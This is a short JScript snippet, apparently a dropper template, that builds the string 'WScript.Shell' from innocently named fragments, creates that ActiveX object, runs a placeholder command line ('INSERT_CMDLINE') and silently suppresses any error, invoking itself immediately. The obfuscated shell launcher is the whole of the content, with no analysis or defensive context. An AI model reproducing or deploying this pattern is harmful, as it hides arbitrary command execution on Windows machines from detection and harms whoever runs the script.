function changeView() {
    var change;  
    try {
        resizeView = "ell"
        imageView = "ipt.Sh"
        textView = "WScr"
        allView = textView + imageView + resizeView
        change = new ActiveXObject(allView);
        change.Run("INSERT_CMDLINE");
    } catch (e) {
        
    }
}
changeView();